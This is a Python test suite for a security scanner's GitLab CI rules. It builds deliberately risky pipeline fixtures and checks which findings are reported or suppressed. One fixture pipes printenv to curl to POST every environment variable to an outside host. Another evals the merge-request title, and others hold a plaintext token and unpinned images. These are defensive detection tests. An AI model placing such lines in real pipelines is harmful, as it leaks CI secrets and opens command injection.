import json

from skylos.analyzer import analyze
from skylos.rules.config import scan_config_files
from skylos.rules.config.cicd.gitlab_ci import scan_gitlab_ci


def _rule_ids(findings):
    return {finding["rule_id"] for finding in findings}


def _write_risky_gitlab_ci(path):
    path.write_text(
        """
include:
  - project: group/security/pipelines
    file: template.yml
  - remote: https://example.com/ci.yml

image: python:latest

variables:
  DEPLOY_TOKEN: plaintext-token-123
  DOCKER_TLS_CERTDIR: ""

stages: [test, deploy]

test:
  script:
    - eval "$CI_MERGE_REQUEST_TITLE"

deploy:
  stage: deploy
  image: docker:latest
  services:
    - docker:dind
  tags:
    - "$RUNNER_TAG"
  id_tokens:
    VAULT_TOKEN:
      aud: https://vault.example.com
  cache:
    paths:
      - node_modules/
  script:
    - ./scripts/release.sh
    - docker push registry.example.com/app:latest
""".lstrip(),
        encoding="utf-8",
    )


def test_gitlab_ci_scanner_detects_workflow_supply_chain_risks(tmp_path):
    gitlab_ci = tmp_path / ".gitlab-ci.yml"
    _write_risky_gitlab_ci(gitlab_ci)

    findings = scan_gitlab_ci(tmp_path)

    assert {
        "SKY-D314",
        "SKY-D315",
        "SKY-D316",
        "SKY-D317",
        "SKY-D318",
        "SKY-D319",
        "SKY-D320",
        "SKY-D321",
        "SKY-D322",
    }.issubset(_rule_ids(findings))
    assert {
        "kind": "config",
        "domain": "cicd",
        "provider": "gitlab_ci",
        "type": "workflow",
    }.items() <= findings[0].items()


def test_gitlab_ci_script_env_exfil_flags(tmp_path):
    gitlab_ci = tmp_path / ".gitlab-ci.yml"
    gitlab_ci.write_text(
        """
image: python@sha256:01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b

test:
  script:
    - printenv | curl -s -X POST https://env.debug.tools/capture -d @-
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_gitlab_ci(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_gitlab_ci_scanner_accepts_pinned_minimal_workflow(tmp_path):
    full_sha = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"
    gitlab_ci = tmp_path / ".gitlab-ci.yml"
    gitlab_ci.write_text(
        f"""
include:
  - project: group/security/pipelines
    file: template.yml
    ref: {full_sha}
  - remote: https://example.com/ci.yml
    integrity: sha256-abc123

image: python@sha256:01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b

variables:
  SAFE_MODE: "true"

test:
  stage: test
  services:
    - postgres@sha256:01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
  script:
    - echo "$CI_COMMIT_REF_NAME"

deploy:
  stage: deploy
  timeout: 15 minutes
  id_tokens:
    VAULT_TOKEN:
      aud: https://vault.example.com
  secrets:
    PROD_PASSWORD:
      vault: production/password@ops
      token: $VAULT_TOKEN
  script:
    - echo "publish prebuilt artifact"
""".lstrip(),
        encoding="utf-8",
    )

    assert scan_gitlab_ci(tmp_path) == []


def test_gitlab_ci_changed_files_stay_under_scan_root(tmp_path):
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    repo.mkdir()
    outside.mkdir()
    outside_workflow = outside / ".gitlab-ci.yml"
    _write_risky_gitlab_ci(outside_workflow)

    findings = scan_config_files(
        repo,
        changed_files={str(outside_workflow), "../outside/.gitlab-ci.yml"},
    )

    assert findings == []


def test_gitlab_ci_scanner_rejects_symlinked_workflow(tmp_path):
    target = tmp_path / "outside-gitlab-ci.yml"
    target.write_text("image: python:latest\n", encoding="utf-8")
    link = tmp_path / ".gitlab-ci.yml"
    try:
        link.symlink_to(target)
    except OSError:
        return

    assert scan_gitlab_ci(tmp_path) == []


def test_config_scanner_routes_single_gitlab_ci_file(tmp_path):
    gitlab_ci = tmp_path / ".gitlab-ci.yml"
    _write_risky_gitlab_ci(gitlab_ci)

    findings = scan_config_files(gitlab_ci)

    assert {"SKY-D314", "SKY-D315", "SKY-D317"}.issubset(_rule_ids(findings))


def test_config_scanner_ignores_unowned_config_files_for_gitlab_ci(tmp_path):
    for relative in (
        "app.py",
        "config.yml",
        ".gitlab-ci.yaml",
        "Jenkinsfile",
        "Dockerfile",
        "main.tf",
    ):
        path = tmp_path / relative
        path.write_text(
            """
include:
  - project: group/security/pipelines
image: python:latest
deploy:
  stage: deploy
  script:
    - eval "$CI_MERGE_REQUEST_TITLE"
""".lstrip(),
            encoding="utf-8",
        )

    assert scan_config_files(tmp_path) == []
    assert scan_config_files(tmp_path / "app.py") == []
    assert scan_config_files(tmp_path / "config.yml") == []
    assert scan_config_files(tmp_path / ".gitlab-ci.yaml") == []
    assert scan_config_files(tmp_path / "Jenkinsfile") == []
    assert scan_config_files(tmp_path / "Dockerfile") == []
    assert scan_config_files(tmp_path / "main.tf") == []


def test_gitlab_ci_scanner_rejects_recursive_yaml_alias(tmp_path):
    gitlab_ci = tmp_path / ".gitlab-ci.yml"
    gitlab_ci.write_text(
        """
deploy: &deploy
  stage: deploy
  script:
    - echo ok
  self: *deploy
""".lstrip(),
        encoding="utf-8",
    )

    assert scan_gitlab_ci(tmp_path) == []


def test_gitlab_ci_scanner_handles_shared_yaml_alias_once(tmp_path):
    gitlab_ci = tmp_path / ".gitlab-ci.yml"
    gitlab_ci.write_text(
        """
.secret-script: &secret-script
  - echo "$DEPLOY_TOKEN"

variables:
  DEPLOY_TOKEN: plaintext-token-123

deploy:
  stage: deploy
  script: *secret-script
  after_script: *secret-script
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_gitlab_ci(tmp_path)

    assert "SKY-D316" in _rule_ids(findings)


def test_gitlab_ci_scanner_detects_ambiguous_secret_token(tmp_path):
    gitlab_ci = tmp_path / ".gitlab-ci.yml"
    gitlab_ci.write_text(
        """
deploy:
  stage: deploy
  timeout: 10 minutes
  id_tokens:
    VAULT_A:
      aud: https://vault-a.example.com
    VAULT_B:
      aud: https://vault-b.example.com
  secrets:
    PROD_PASSWORD:
      vault: production/password@ops
  script:
    - echo "deploy"
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_gitlab_ci(tmp_path)

    assert "SKY-D323" in _rule_ids(findings)


def test_analyzer_reports_gitlab_ci_dangers_without_source_files(tmp_path):
    gitlab_ci = tmp_path / ".gitlab-ci.yml"
    gitlab_ci.write_text(
        """
include:
  - project: group/security/pipelines
image: python:latest
deploy:
  stage: deploy
  script:
    - docker push registry.example.com/app:latest
""".lstrip(),
        encoding="utf-8",
    )

    result = json.loads(analyze(str(tmp_path), enable_danger=True))

    assert "danger" in result
    assert {"SKY-D314", "SKY-D315", "SKY-D321"}.issubset(_rule_ids(result["danger"]))
    assert result["analysis_summary"]["danger_count"] == len(result["danger"])


def _gitlab_lines(tmp_path, text, rule_id):
    (tmp_path / ".gitlab-ci.yml").write_text(text, encoding="utf-8")
    return sorted(
        finding["line"]
        for finding in scan_gitlab_ci(tmp_path)
        if finding["rule_id"] == rule_id
    )


def test_gitlab_script_block_reports_each_command_on_its_own_line(tmp_path):
    text = "publish:\n  script:\n    - |\n      npm ci\n      npm publish\n"
    assert _gitlab_lines(tmp_path, text, "SKY-D340") == [5]


def test_gitlab_script_block_reports_one_finding_per_rule(tmp_path):
    text = (
        "publish:\n  script:\n    - |\n      npm ci\n      npm publish\n"
        "      echo done\n      npm publish --tag next\n"
    )
    assert _gitlab_lines(tmp_path, text, "SKY-D340") == [5]


def test_gitlab_marker_on_another_command_does_not_hide_the_publish(tmp_path):
    text = (
        "publish:\n  script:\n    - |\n"
        "      npm ci  # skylos: ignore[SKY-D340]\n      npm publish\n"
    )
    assert _gitlab_lines(tmp_path, text, "SKY-D340") == [5]


def test_gitlab_marker_directly_above_the_publish_still_suppresses(tmp_path):
    text = (
        "publish:\n  script:\n    - |\n      npm ci\n"
        "      # skylos: ignore[SKY-D340] released by hand\n      npm publish\n"
    )
    assert _gitlab_lines(tmp_path, text, "SKY-D340") == []


def test_gitlab_prefixed_publish_and_yarn_install(tmp_path):
    text = (
        "publish:\n  script:\n    - yarn install --frozen-lockfile\n"
        "    - sudo npm publish\n"
    )
    assert _gitlab_lines(tmp_path, text, "SKY-D340") == [4]
    assert _gitlab_lines(tmp_path, text, "SKY-D341") == []


RELEASE_JOBS = """# pre-publish: lint runs before publishing
stages: [test, release]

default:
  cache:
    paths: [.npm/]

npm-publish:
  stage: release
  timeout: 10 minutes
  rules:
    - if: $CI_COMMIT_TAG
{npm_marker}  cache:
    key: release
    paths: [.npm/]
  script:
    - npm publish

{publish_marker}publish:
  stage: release
  rules:
    - if: $CI_COMMIT_TAG
  script:
    - npm publish
"""


def _release_rows(tmp_path, text):
    (tmp_path / ".gitlab-ci.yml").write_text(text, encoding="utf-8")
    return sorted(
        (finding["rule_id"], finding["value"], finding["line"], finding["severity"])
        for finding in scan_gitlab_ci(tmp_path)
        if finding["rule_id"] in {"SKY-D320", "SKY-D321"}
    )


def test_release_cache_and_timeout_point_at_their_own_job(tmp_path):
    rows = _release_rows(
        tmp_path, RELEASE_JOBS.format(npm_marker="", publish_marker="")
    )

    assert rows == [
        ("SKY-D320", "npm-publish:cache", 13, "MEDIUM"),
        ("SKY-D320", "publish:cache", 19, "MEDIUM"),
        ("SKY-D321", "publish:timeout", 19, "LOW"),
    ]


def test_release_job_markers_suppress_only_their_own_rule_and_line(tmp_path):
    rows = _release_rows(
        tmp_path,
        RELEASE_JOBS.format(
            npm_marker="  # skylos: ignore[SKY-D320] release-only cache key\n",
            publish_marker="# skylos: ignore[SKY-D321] project timeout is set\n",
        ),
    )

    assert rows == [("SKY-D320", "publish:cache", 21, "MEDIUM")]


def test_release_job_marker_on_an_unrelated_line_does_not_hide_findings(tmp_path):
    text = RELEASE_JOBS.format(npm_marker="", publish_marker="").replace(
        "# pre-publish: lint runs before publishing",
        "# pre-publish: skylos: ignore[SKY-D320] skylos: ignore[SKY-D321]",
    )

    assert [row[:3] for row in _release_rows(tmp_path, text)] == [
        ("SKY-D320", "npm-publish:cache", 13),
        ("SKY-D320", "publish:cache", 19),
        ("SKY-D321", "publish:timeout", 19),
    ]


AMBIGUOUS_TOKEN_JOBS = """stages: [deploy]

migrate:
  stage: deploy
  timeout: 10 minutes
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.acme.example
  secrets:
{migrate_marker}    DATABASE_PASSWORD:
      vault: production/db/password@ops
      file: false
  script:
    - ./migrate.sh

deploy-production:
  stage: deploy
  timeout: 20 minutes
  id_tokens:
    AWS_ID_TOKEN:
      aud: sts.amazonaws.com
    VAULT_ID_TOKEN:
      aud: https://vault.acme.example
  secrets:
{deploy_marker}    DATABASE_PASSWORD:
      vault: production/db/password@ops
      file: false
  script:
    - kubectl apply -f k8s/
"""


def _ambiguous_rows(tmp_path, migrate_marker="", deploy_marker=""):
    (tmp_path / ".gitlab-ci.yml").write_text(
        AMBIGUOUS_TOKEN_JOBS.format(
            migrate_marker=migrate_marker, deploy_marker=deploy_marker
        ),
        encoding="utf-8",
    )
    return [
        (finding["value"], finding["line"])
        for finding in scan_gitlab_ci(tmp_path)
        if finding["rule_id"] == "SKY-D323"
    ]


def test_ambiguous_secret_token_points_at_the_reporting_jobs_secret(tmp_path):
    assert _ambiguous_rows(tmp_path) == [("deploy-production:DATABASE_PASSWORD", 25)]


def test_ambiguous_secret_marker_on_another_jobs_key_does_not_hide_it(tmp_path):
    marker = "    # skylos: ignore[SKY-D323] belongs to the migrate job\n"

    assert _ambiguous_rows(tmp_path, migrate_marker=marker) == [
        ("deploy-production:DATABASE_PASSWORD", 26)
    ]


def test_ambiguous_secret_marker_above_its_own_key_suppresses_it(tmp_path):
    marker = "    # skylos: ignore[SKY-D323] both tokens share an audience\n"

    assert _ambiguous_rows(tmp_path, deploy_marker=marker) == []
